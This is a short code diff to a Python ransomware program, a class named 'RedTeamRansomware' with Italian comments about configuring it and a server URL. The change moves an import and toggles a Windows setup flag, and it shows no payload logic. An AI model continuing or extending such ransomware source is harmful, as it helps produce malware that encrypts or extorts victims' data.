@@ -5,6 +5,7 @@ import importlib.util
 from pathlib import Path
 import urllib.request
 import tempfile
+import argparse
 
 # ========== CONFIGURAZIONE GLOBALE ==========
 # ⚠️ MODIFICA QUESTE VARIABILI PER CONFIGURARE IL RANSOMWARE ⚠️
@@ -41,7 +42,6 @@ class RedTeamRansomware:
         import shutil
         import base64
         import uuid
-        import argparse
         self.server_url = SERVER_URL
         self.mode = mode
         self.key = None
@@ -495,7 +495,7 @@ def main():
     # Verifica se ci sono le librerie
     # Configurazione con opzioni
     success = setup_windows_environment(
-        skip_vcredist=False,  # Salta VC++ se già installato
+        skip_vcredist=True,  # Salta VC++ se già installato
         verbose=False         # Output meno dettagliato
     )
     if success:
